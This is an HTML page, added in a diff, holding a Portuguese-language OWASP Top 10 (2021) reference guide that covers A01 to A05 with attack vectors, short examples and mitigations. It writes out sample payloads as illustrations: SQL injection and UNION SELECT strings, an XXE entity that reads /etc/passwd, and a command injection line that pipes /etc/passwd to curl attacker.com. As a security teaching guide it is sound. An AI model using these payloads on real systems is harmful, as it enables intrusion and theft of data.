@@ -1,0 +1,497 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>OWASP Top 10</title>
+
+<meta name="description" content="Guia de referência técnica — edição 2021: vetores de ataque, exemplos e mitigações">
+<script>try{var m=localStorage.getItem('hub-theme');if(m&&m!=='auto')document.documentElement.setAttribute('data-theme',m)}catch(e){}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@600;700&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&family=JetBrains+Mono:wght@400;500;600&display=swap">
+<style>
+:root{
+  color-scheme:light;
+  --bg:#F4F6FA; --surface:#FFFFFF; --sunk:#EBEFF5; --ink:#141B2B; --ink-2:#44506A; --ink-3:#6B7790;
+  --line:#D8DFEA; --line-2:#C5CEDD; --accent:#0A7EA4; --accent-soft:color-mix(in srgb,var(--accent) 12%,var(--surface));
+  --warn:#B4531A; --warn-soft:#FCEEE3; --tip:#1E7C4B; --tip-soft:#E4F4EA;
+  --code-bg:#0E1628; --code-ink:#D6E2F5;
+  --shadow:0 1px 2px rgba(20,27,43,.05),0 10px 30px -18px rgba(20,27,43,.25);
+  --f-disp:"Chakra Petch","Space Grotesk",system-ui,sans-serif;
+  --f-body:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --f-mono:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace;
+  --side:300px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  color-scheme:dark;
+  --bg:#070B14; --surface:#0E1628; --sunk:#0A1120; --ink:#E6EEFB; --ink-2:#A9B7D0; --ink-3:#7485A3;
+  --line:#1D2A42; --line-2:#2A3A58; --accent:#35E0FF; --accent-soft:color-mix(in srgb,var(--accent) 14%,var(--surface));
+  --warn:#FFB547; --warn-soft:#2A1F10; --tip:#7EE2A8; --tip-soft:#10261B; --code-bg:#050910; --code-ink:#D6E2F5;
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 14px 36px -20px rgba(0,0,0,.7);
+}}
+:root[data-theme="dark"]{
+  color-scheme:dark;
+  --bg:#070B14; --surface:#0E1628; --sunk:#0A1120; --ink:#E6EEFB; --ink-2:#A9B7D0; --ink-3:#7485A3;
+  --line:#1D2A42; --line-2:#2A3A58; --accent:#35E0FF; --accent-soft:color-mix(in srgb,var(--accent) 14%,var(--surface));
+  --warn:#FFB547; --warn-soft:#2A1F10; --tip:#7EE2A8; --tip-soft:#10261B; --code-bg:#050910; --code-ink:#D6E2F5;
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 14px 36px -20px rgba(0,0,0,.7);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:20px}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--f-body);font-size:16px;line-height:1.65;-webkit-font-smoothing:antialiased}
+a{color:var(--accent)}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+::selection{background:var(--accent);color:var(--bg)}
+#progress{position:fixed;top:0;left:0;height:3px;width:0;background:var(--accent);z-index:60;box-shadow:0 0 12px var(--accent)}
+
+.shell{display:grid;grid-template-columns:var(--side) minmax(0,1fr);min-height:100vh}
+aside{position:sticky;top:0;height:100vh;display:flex;flex-direction:column;border-right:1px solid var(--line);background:var(--surface)}
+.side-top{padding:18px 18px 12px;border-bottom:1px solid var(--line)}
+.hub{display:inline-flex;align-items:center;gap:8px;font:600 11.5px var(--f-mono);letter-spacing:.16em;color:var(--ink-2);text-decoration:none;margin-bottom:14px}
+.hub b{color:var(--accent)}
+.hub:hover{color:var(--accent)}
+.side-title{font:700 15px/1.25 var(--f-disp);letter-spacing:.01em;margin:0 0 12px;text-transform:uppercase}
+.filter{width:100%;background:var(--sunk);border:1px solid var(--line);border-radius:8px;padding:8px 10px;font:500 13px var(--f-body);color:var(--ink)}
+.filter:focus{outline:none;border-color:var(--accent)}
+nav.toc{flex:1;overflow:auto;padding:10px 0 20px}
+nav.toc a{display:block;padding:5px 18px 5px 16px;border-left:2px solid transparent;color:var(--ink-2);text-decoration:none;font-size:13.5px;line-height:1.35}
+nav.toc a.l3{padding-left:30px;font-size:12.8px;color:var(--ink-3)}
+nav.toc a:hover{color:var(--ink);background:var(--sunk)}
+nav.toc a.on{color:var(--accent);border-left-color:var(--accent);background:var(--accent-soft);font-weight:600}
+nav.toc a[hidden]{display:none}
+.side-foot{display:flex;justify-content:space-between;align-items:center;gap:8px;padding:10px 18px;border-top:1px solid var(--line);font:500 11px var(--f-mono);color:var(--ink-3)}
+.theme{background:none;border:1px solid var(--line);border-radius:6px;padding:5px 9px;font:500 11px var(--f-mono);color:var(--ink-2);cursor:pointer}
+.theme:hover{border-color:var(--accent);color:var(--accent)}
+
+main{min-width:0;padding:0 clamp(16px,5vw,64px) 120px;overflow-x:clip}
+.doc{max-width:900px;margin:0 auto}
+.hero{padding:56px 0 30px;border-bottom:1px solid var(--line);margin-bottom:12px;position:relative}
+.hero::before{content:"";position:absolute;inset:0 -40px auto;height:220px;background:radial-gradient(600px 200px at 10% 0%,var(--accent-soft),transparent 70%);z-index:-1}
+.kicker{font:600 11.5px var(--f-mono);letter-spacing:.2em;text-transform:uppercase;color:var(--accent);display:flex;align-items:center;gap:10px}
+.kicker::before{content:"";width:24px;height:1px;background:var(--accent)}
+.hero h1{font:700 clamp(32px,5.2vw,54px)/1.02 var(--f-disp);letter-spacing:-.005em;margin:14px 0 12px;text-transform:uppercase;text-wrap:balance}
+.hero .sub{font-size:18px;color:var(--ink-2);max-width:62ch;margin:0 0 16px}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin:18px 0 0}
+.chip{font:500 11.5px var(--f-mono);color:var(--ink-2);border:1px solid var(--line-2);border-radius:999px;padding:4px 10px;background:var(--surface)}
+.hero-extra{margin-top:20px;color:var(--ink-2);font-size:15px}
+.hero-extra p{margin:0 0 8px;max-width:70ch}
+
+.doc h2{font:700 clamp(22px,2.6vw,28px)/1.15 var(--f-disp);margin:56px 0 14px;padding-top:14px;border-top:1px solid var(--line);letter-spacing:.005em;text-wrap:balance}
+.doc h3{font:600 19px/1.3 var(--f-disp);margin:34px 0 10px;color:var(--ink)}
+.doc h4{font:600 16px/1.35 var(--f-body);margin:26px 0 8px;color:var(--accent)}
+.doc h5{font:600 14px var(--f-mono);margin:20px 0 6px;letter-spacing:.04em;text-transform:uppercase;color:var(--ink-2)}
+.hero + h2,.hero + .assess-bar + h2{border-top:0;margin-top:30px;padding-top:0}
+.doc h2.banner{display:flex;flex-wrap:wrap;align-items:center;gap:10px 14px}
+.doc h2.banner .code{font:700 14px var(--f-mono);color:var(--bg);background:var(--accent);padding:4px 9px;border-radius:6px}
+.doc h2.banner .tag{font:600 11px var(--f-mono);letter-spacing:.1em;color:var(--warn);border:1px solid currentColor;border-radius:999px;padding:3px 10px}
+.doc p{margin:0 0 14px;max-width:74ch}
+.doc p.lead-in{font:600 14.5px var(--f-body);color:var(--ink);margin:20px 0 8px}
+.doc ul,.doc ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+.doc li{margin:4px 0}
+.doc li>ul,.doc li>ol{margin:4px 0}
+.doc li::marker{color:var(--accent)}
+.doc strong{font-weight:600;color:var(--ink)}
+.doc code{font:500 .86em var(--f-mono);background:var(--sunk);border:1px solid var(--line);border-radius:4px;padding:1px 5px}
+.doc pre{background:var(--code-bg);color:var(--code-ink);border-radius:10px;padding:14px 16px;overflow:auto;font:13px/1.55 var(--f-mono);margin:0 0 18px;border:1px solid var(--line)}
+.doc pre code{background:none;border:0;padding:0;color:inherit;font-size:inherit}
+.doc blockquote{margin:0 0 16px;padding:10px 16px;border-left:3px solid var(--accent);background:var(--accent-soft);border-radius:0 8px 8px 0}
+.doc blockquote p{margin:0}
+.callout{border:1px solid var(--line);border-left:3px solid var(--accent);background:var(--surface);border-radius:10px;padding:14px 18px;margin:18px 0 20px;box-shadow:var(--shadow)}
+.callout>*:last-child{margin-bottom:0}
+.callout p{max-width:none}
+.callout.warn{border-left-color:var(--warn);background:var(--warn-soft)}
+.callout.tip{border-left-color:var(--tip);background:var(--tip-soft)}
+.tbl-wrap{overflow-x:auto;margin:0 0 20px;border:1px solid var(--line);border-radius:10px;background:var(--surface);box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:14px}
+th,td{text-align:left;vertical-align:top;padding:9px 12px;border-bottom:1px solid var(--line)}
+thead th{position:sticky;top:0;background:var(--sunk);font:600 11.5px var(--f-mono);letter-spacing:.06em;text-transform:uppercase;color:var(--ink-2);border-bottom:1px solid var(--line-2);white-space:nowrap}
+tbody tr:last-child td{border-bottom:0}
+tbody tr:hover td{background:color-mix(in srgb,var(--accent) 4%,transparent)}
+td p{margin:0 0 6px;max-width:none}
+td p:last-child{margin:0}
+td ul,td ol{margin:0;padding-left:18px}
+.tbl-wrap table.wide{min-width:760px}
+
+/* autoavaliação */
+.assess-bar{position:sticky;top:0;z-index:20;margin:18px 0 0;padding:10px 14px;background:color-mix(in srgb,var(--surface) 92%,transparent);backdrop-filter:blur(8px);border:1px solid var(--line);border-radius:10px;display:flex;flex-wrap:wrap;gap:8px 16px;align-items:center;font:500 12.5px var(--f-mono);color:var(--ink-2)}
+.assess-bar .meter{flex:1 1 180px;height:8px;border-radius:4px;background:var(--sunk);overflow:hidden;display:flex}
+.assess-bar .meter i{display:block;height:100%}
+.k-d{--k:var(--tip)} .k-r{--k:var(--warn)} .k-e{--k:#E5484D}
+.assess-bar b{color:var(--k,var(--ink))}
+.assess-bar button{margin-left:auto}
+table.assess td:nth-child(1){font-weight:600;min-width:160px}
+table.assess td:nth-child(5){white-space:nowrap;font:500 12px var(--f-mono);color:var(--ink-3)}
+td.mark{white-space:nowrap}
+.mk{display:inline-flex;gap:4px}
+.mk button{border:1px solid var(--line-2);background:transparent;color:var(--ink-3);border-radius:6px;padding:3px 7px;font:600 11px var(--f-mono);cursor:pointer}
+.mk button:hover{border-color:var(--k);color:var(--k)}
+.mk button[aria-pressed="true"]{background:var(--k);border-color:var(--k);color:var(--bg)}
+.sec-count{font:500 12px var(--f-mono);color:var(--ink-3);margin:-6px 0 12px}
+
+
+/* componentes extras */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin:18px 0 22px}
+.stats div{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:12px 14px;box-shadow:var(--shadow)}
+.stats b{display:block;font:700 30px/1 var(--f-disp);color:var(--accent)}
+.stats span{font:500 11px var(--f-mono);letter-spacing:.1em;text-transform:uppercase;color:var(--ink-3)}
+.cols{display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,220px),1fr));gap:12px;margin:0 0 20px}
+.cols>div{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:12px 14px}
+.cols h5{margin:0 0 6px;color:var(--accent)}
+.cols ul{margin:0;padding-left:18px;font-size:14px}
+.res{list-style:none;padding:0!important;margin:0 0 20px;display:grid;gap:6px}
+.res li{display:flex;gap:10px;align-items:baseline;font-size:14px;margin:0}
+.res li::marker{content:none}
+.badge{flex:none;font:600 10px var(--f-mono);letter-spacing:.08em;padding:2px 7px;border-radius:5px;border:1px solid currentColor}
+.badge.free{color:var(--tip)} .badge.paid{color:var(--warn)}
+.phase{margin:64px 0 0;padding:22px 22px 6px;border:1px solid var(--line);border-radius:14px;background:linear-gradient(180deg,var(--accent-soft),transparent 60%)}
+.phase .kicker{margin-bottom:4px}
+.doc .phase h2{border-top:0;margin-top:6px;padding-top:0}
+.mod-k{font:600 11px var(--f-mono);letter-spacing:.14em;text-transform:uppercase;color:var(--ink-3);margin:34px 0 0}
+.doc .mod-k + h3{margin-top:4px}
+.split{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin:0 0 18px}
+.split div{border:1px solid var(--line);border-radius:10px;padding:10px 12px;background:var(--surface)}
+.split b{font:700 24px var(--f-disp);color:var(--accent);display:block}
+
+.mobile-bar{display:none}
+.fab{position:fixed;left:16px;bottom:16px;z-index:50;font:600 12px/1 var(--f-mono);letter-spacing:.12em;color:#35E0FF!important;background:rgba(6,10,18,.9)!important;border:1px solid rgba(53,224,255,.45);padding:9px 13px;border-radius:999px;text-decoration:none;box-shadow:0 0 18px rgba(53,224,255,.25);display:none}
+.totop{position:fixed;right:18px;bottom:18px;z-index:50;width:40px;height:40px;border-radius:50%;border:1px solid var(--line-2);background:var(--surface);color:var(--ink-2);cursor:pointer;opacity:0;pointer-events:none;transition:opacity .2s;box-shadow:var(--shadow)}
+.totop.show{opacity:1;pointer-events:auto}
+@media (max-width:980px){
+  .shell{grid-template-columns:1fr}
+  aside{position:fixed;inset:0 auto 0 0;width:min(86vw,320px);z-index:70;transform:translateX(-102%);transition:transform .25s ease;box-shadow:var(--shadow)}
+  aside.open{transform:none}
+  .scrim{position:fixed;inset:0;background:rgba(5,8,15,.5);z-index:65;display:none}
+  .scrim.open{display:block}
+  .mobile-bar{display:flex;position:sticky;top:0;z-index:40;align-items:center;gap:10px;padding:10px 16px;margin:0 calc(-1 * clamp(16px,5vw,64px));background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+  .mobile-bar button{border:1px solid var(--line-2);background:var(--surface);color:var(--ink);border-radius:8px;padding:6px 10px;font:600 12px var(--f-mono);cursor:pointer}
+  .mobile-bar span{font:700 13px var(--f-disp);text-transform:uppercase;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
+  .fab{display:inline-block}
+  .hero{padding-top:28px}
+  table.assess thead{display:none}
+  .tbl-wrap table.assess{min-width:0}
+  .assess-bar{top:54px}
+  .mobile-bar button{white-space:nowrap}
+  table.assess,table.assess tbody,table.assess tr,table.assess td{display:block;width:100%}
+  table.assess tr{border-bottom:1px solid var(--line);padding:10px 12px}
+  table.assess td{border:0;padding:3px 0}
+  table.assess td[data-l]::before{content:attr(data-l);display:block;font:600 10.5px var(--f-mono);letter-spacing:.08em;text-transform:uppercase;color:var(--ink-3)}
+  table.assess td:nth-child(1){font-size:16px}
+}
+@media print{
+  aside,.mobile-bar,.fab,.totop,#progress,.assess-bar button{display:none!important}
+  .shell{display:block} main{padding:0} body{background:#fff;color:#000}
+  .tbl-wrap,.callout{box-shadow:none}
+}
+@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}*{transition:none!important}}
+</style>
+</head>
+<body data-doc="arquitetura-owasp-top10">
+<div id="progress"></div>
+<div class="scrim"></div>
+<div class="shell">
+<aside aria-label="Sumário">
+  <div class="side-top">
+    <a class="hub" href="../../index.html">◂ RAFAEL<b>//</b>HUB</a>
+    <p class="side-title">OWASP Top 10</p>
+    <input class="filter" id="filter" type="search" placeholder="Filtrar seções…  ( / )" aria-label="Filtrar seções">
+  </div>
+  <nav class="toc"><a href="#visão-geral-owasp-top-10-2021" class="l2">Visão Geral — OWASP Top 10 (2021)</a>
+<a href="#a01-quebra-de-controle-de-acesso" class="l2">A01 · Quebra de Controle de Acesso</a>
+<a href="#a02-falhas-criptográficas" class="l2">A02 · Falhas Criptográficas</a>
+<a href="#a03-injeção" class="l2">A03 · Injeção</a>
+<a href="#a04-design-inseguro" class="l2">A04 · Design Inseguro</a>
+<a href="#a05-configuração-de-segurança-incorreta" class="l2">A05 · Configuração de Segurança Incorreta</a>
+<a href="#a06-componentes-vulneráveis-e-desatualizados" class="l2">A06 · Componentes Vulneráveis e Desatualizados</a>
+<a href="#a07-falhas-de-identificação-e-autenticação" class="l2">A07 · Falhas de Identificação e Autenticação</a>
+<a href="#a08-falhas-de-integridade-de-software-e-dados" class="l2">A08 · Falhas de Integridade de Software e Dados</a>
+<a href="#a09-falhas-de-registro-e-monitoramento" class="l2">A09 · Falhas de Registro e Monitoramento</a>
+<a href="#a10-server-side-request-forgery-ssrf" class="l2">A10 · Server-Side Request Forgery (SSRF)</a></nav>
+  <div class="side-foot"><span>convertido de .docx</span><button class="theme" id="theme" type="button">tema: auto</button></div>
+</aside>
+<main>
+  <div class="mobile-bar"><button id="menu" type="button" aria-label="Abrir sumário">☰ Sumário</button><span>OWASP Top 10</span></div>
+  <article class="doc">
+    <header class="hero">
+      <div class="kicker">SYS.ARCH · Segurança</div>
+      <h1>OWASP Top 10</h1>
+      <p class="sub">Guia de referência técnica — edição 2021: vetores de ataque, exemplos e mitigações</p>
+      <div class="chips"><span class="chip">10 riscos</span><span class="chip">edição 2021</span><span class="chip">convertido de .docx</span></div>
+      
+    </header>
+<h2 id="visão-geral-owasp-top-10-2021">Visão Geral — OWASP Top 10 (2021)</h2>
+<div class="tbl-wrap"><table><thead><tr><th><strong>ID</strong></th><th><strong>Vulnerabilidade</strong></th><th><strong>Risco</strong></th></tr></thead><tbody><tr><td><p><strong>A01</strong></p></td><td><p>Quebra de Controle de Acesso</p></td><td><p><strong>CRÍTICO</strong></p></td></tr><tr><td><p><strong>A02</strong></p></td><td><p>Falhas Criptográficas</p></td><td><p><strong>CRÍTICO</strong></p></td></tr><tr><td><p><strong>A03</strong></p></td><td><p>Injeção</p></td><td><p><strong>CRÍTICO</strong></p></td></tr><tr><td><p><strong>A04</strong></p></td><td><p>Design Inseguro</p></td><td><p><strong>ALTO</strong></p></td></tr><tr><td><p><strong>A05</strong></p></td><td><p>Configuração de Segurança Incorreta</p></td><td><p><strong>ALTO</strong></p></td></tr><tr><td><p><strong>A06</strong></p></td><td><p>Componentes Vulneráveis e Desatualizados</p></td><td><p><strong>ALTO</strong></p></td></tr><tr><td><p><strong>A07</strong></p></td><td><p>Falhas de Identificação e Autenticação</p></td><td><p><strong>ALTO</strong></p></td></tr><tr><td><p><strong>A08</strong></p></td><td><p>Falhas de Integridade de Software e Dados</p></td><td><p><strong>ALTO</strong></p></td></tr><tr><td><p><strong>A09</strong></p></td><td><p>Falhas de Registro e Monitoramento</p></td><td><p><strong>MÉDIO</strong></p></td></tr><tr><td><p><strong>A10</strong></p></td><td><p>Server-Side Request Forgery (SSRF)</p></td><td><p><strong>CRÍTICO</strong></p></td></tr></tbody></table></div>
+<h2 id="a01-quebra-de-controle-de-acesso" class="banner"><span class="code">A01</span> Quebra de Controle de Acesso <span class="tag">RISCO  CRÍTICO</span></h2>
+<p>Falhas que permitem usuários agirem fora de suas permissões pretendidas — acessando dados, funções ou contas de outros usuários.</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #1 (subiu de #5 em 2017)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-22, CWE-284, CWE-285, CWE-639, CWE-862, CWE-863</p></td></tr><tr><td><p><strong>Ocorrência</strong></p></td><td><p>94% das aplicações testadas tinham alguma forma de controle de acesso quebrado</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque">Vetores de Ataque</h3>
+<ul><li>
+Acesso direto a URL por modificação de path (forced browsing): /admin/users
+</li><li>
+IDOR (Insecure Direct Object Reference): trocar id=123 por id=456 na query string
+</li><li>
+Escalada de privilégio vertical: user comum acessa funcionalidade de admin
+</li><li>
+Escalada horizontal: usuário A acessa dados do usuário B via manipulação de parâmetro
+</li><li>
+Bypass de CORS mal configurado: wildcard ou origem untrusted permitida
+</li><li>
+JWT com claim de role forjado por falta de validação server-side
+</li></ul>
+<h3 id="exemplos-técnicos">Exemplos Técnicos</h3>
+<pre><code>GET /api/orders?userId=999  → retorna pedidos de outro usuário
+DELETE /api/users/1  → admin endpoint acessível sem verificação de role</code></pre>
+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>Implementar deny-by-default: negar tudo, liberar explicitamente</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Validar permissões server-side em CADA request (nunca confiar no client)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Usar IDs indiretos (GUIDs opacos) ou mapeamento server-side em vez de IDs sequenciais</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Registrar e alertar falhas de controle de acesso (audit log)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Revisar políticas de CORS — nunca usar wildcard em APIs com dados sensíveis</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Invalidar tokens JWT corretamente no logout; usar JTI para revogação</p></td></tr></tbody></table></div>
+<h2 id="a02-falhas-criptográficas" class="banner"><span class="code">A02</span> Falhas Criptográficas <span class="tag">RISCO  CRÍTICO</span></h2>
+<p>Proteção insuficiente de dados em trânsito ou em repouso. Antes chamado de 'Exposição de Dados Sensíveis', o foco agora é nas raízes criptográficas do problema.</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #2 (era #3 em 2017)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-261, CWE-296, CWE-310, CWE-319, CWE-321, CWE-326, CWE-327</p></td></tr><tr><td><p><strong>Dados em risco</strong></p></td><td><p>Senhas, cartões de crédito, PII, tokens, chaves privadas</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque-2">Vetores de Ataque</h3>
+<ul><li>
+Downgrade de TLS via POODLE, BEAST, ROBOT para descriptografar tráfego
+</li><li>
+Quebra de hashes MD5/SHA-1 por rainbow tables e GPU cracking
+</li><li>
+Senhas armazenadas em texto plano ou com hash sem salt
+</li><li>
+Chaves AES hardcoded no código-fonte ou em repositórios públicos
+</li><li>
+Transmissão de dados sensíveis via HTTP (sem TLS) em redes intermediadas
+</li><li>
+Uso de ECB mode em AES: revela padrões no ciphertext
+</li></ul>
+<h3 id="exemplos-técnicos-2">Exemplos Técnicos</h3>
+<pre><code>Hash: MD5('senha123') → quebrável em segundos via rainbow table
+Bcrypt com work factor 4 (mínimo é 10–12 para senhas)</code></pre>
+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>TLS 1.2+ obrigatório; desabilitar TLS 1.0/1.1, SSL 2/3; usar HSTS</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Hashing de senhas: bcrypt (cost &gt;= 12), Argon2id, ou scrypt — nunca MD5/SHA-x</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Criptografia simétrica: AES-256-GCM; nunca usar ECB mode</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Chaves e segredos fora do código: usar vault (HashiCorp, AWS Secrets Manager)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Cifras de fluxo autenticadas (AEAD) para garantir integridade + confidencialidade</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Verificar validade de certificados TLS; implementar Certificate Pinning em mobile</p></td></tr></tbody></table></div>
+<h2 id="a03-injeção" class="banner"><span class="code">A03</span> Injeção <span class="tag">RISCO  CRÍTICO</span></h2>
+<p>Dados não confiáveis enviados a um interpretador como parte de um comando ou query. SQL Injection, NoSQL Injection, LDAP Injection, Command Injection, etc.</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #3 (era #1 em 2017; XSS integrado aqui)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-20, CWE-74, CWE-75, CWE-77, CWE-78, CWE-79, CWE-89, CWE-116</p></td></tr><tr><td><p><strong>Mais comum</strong></p></td><td><p>SQL Injection, Cross-Site Scripting (XSS), OS Command Injection</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque-3">Vetores de Ataque</h3>
+<ul><li>
+SQL Injection clássico: ' OR '1'='1 — bypass de autenticação
+</li><li>
+Blind SQLi: inferir dados via respostas booleanas ou tempo (SLEEP/WAITFOR)
+</li><li>
+Union-based SQLi: UNION SELECT username,password FROM users--
+</li><li>
+OS Command Injection: ; cat /etc/passwd | curl attacker.com
+</li><li>
+Stored XSS: script persistido no BD, executado em outros usuários
+</li><li>
+Reflected XSS: payload na URL refletido imediatamente na response
+</li><li>
+DOM-based XSS: manipulação do DOM client-side sem passar pelo servidor
+</li></ul>
+<h3 id="exemplos-técnicos-3">Exemplos Técnicos</h3>
+<pre><code>SELECT * FROM users WHERE user='$input'  → vulnerável
+SELECT * FROM users WHERE user=?  → parametrizado, seguro</code></pre>
+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>Prepared Statements / Parameterized Queries em TODA query ao banco</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>ORM com proteção nativa a SQL Injection (Hibernate, SQLAlchemy, etc.)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Validação de entrada: whitelist de caracteres permitidos, não blacklist</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Escapar saídas HTML/JS: usar bibliotecas como DOMPurify, OWASP Java Encoder</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Content Security Policy (CSP) para mitigar XSS — nonce/hash por script</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Least privilege no banco: conta da app sem DROP/ALTER; sem acesso a system tables</p></td></tr></tbody></table></div>
+<h2 id="a04-design-inseguro" class="banner"><span class="code">A04</span> Design Inseguro <span class="tag">RISCO  ALTO</span></h2>
+<p>Categoria nova em 2021. Falhas em controles de design e arquitetura — ameaças não modeladas, fluxos de negócio sem validação, ausência de segurança by design.</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #4 (nova categoria)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-73, CWE-183, CWE-209, CWE-256, CWE-501, CWE-522</p></td></tr><tr><td><p><strong>Diferença chave</strong></p></td><td><p>Não é falha de implementação — é ausência de controle desde a concepção</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque-4">Vetores de Ataque</h3>
+<ul><li>
+Fluxo de recuperação de senha que revela respostas secretas previsíveis
+</li><li>
+Lógica de negócio permitindo reservar -1 tickets ou comprar itens com preço negativo
+</li><li>
+API sem rate limiting: força bruta em OTP, senhas, vouchers
+</li><li>
+Multi-tenant app sem isolamento: dados de um tenant visíveis a outro por design
+</li><li>
+Workflow crítico sem etapa de confirmação (double-submit para transferências)
+</li></ul>
+<h3 id="exemplos-técnicos-4">Exemplos Técnicos</h3>
+<pre><code>Fluxo de checkout sem validar preço server-side — cliente altera valor no request
+Reset de senha via e-mail com link sem expiração nem uso único</code></pre>
+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>Threat Modeling (STRIDE, PASTA) em cada funcionalidade crítica</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Secure Design Patterns: fail-safe defaults, complete mediation, least privilege</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Validação de regras de negócio server-side — nunca confiar em client</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Rate limiting e CAPTCHA em todos os endpoints de autenticação e transações</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Testes de lógica de negócio (abuse cases) além de testes funcionais</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Revisão de segurança em arquitetura antes de codar (Architecture Risk Analysis)</p></td></tr></tbody></table></div>
+<h2 id="a05-configuração-de-segurança-incorreta" class="banner"><span class="code">A05</span> Configuração de Segurança Incorreta <span class="tag">RISCO  ALTO</span></h2>
+<p>Configurações padrão inseguras, features desnecessárias habilitadas, mensagens de erro verbosas, permissões excessivas em cloud ou infra.</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #5 (era #6 em 2017; XML External Entities integrado)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-2, CWE-11, CWE-13, CWE-15, CWE-16, CWE-260, CWE-520, CWE-611, CWE-732</p></td></tr><tr><td><p><strong>Inclui</strong></p></td><td><p>XXE (XML External Entities), headers HTTP, CORS, cloud IAM</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque-5">Vetores de Ataque</h3>
+<ul><li>
+Stack trace exposto em produção: revela framework, versões, paths internos
+</li><li>
+XXE: &lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt; para leitura de arquivos internos
+</li><li>
+Credenciais padrão em painéis admin: admin/admin, tomcat/tomcat
+</li><li>
+S3 Bucket público: listagem e download de dados sensíveis
+</li><li>
+Headers de segurança ausentes: sem X-Frame-Options, sem CSP, sem HSTS
+</li><li>
+Features de debug ativas em produção (debug=True no Django, actuator sem auth)
+</li></ul>
+<h3 id="exemplos-técnicos-5">Exemplos Técnicos</h3>
+<pre><code>Spring Boot Actuator exposto sem autenticação: /actuator/env, /actuator/dump
+CORS: Access-Control-Allow-Origin: * em API com dados sensíveis</code></pre>
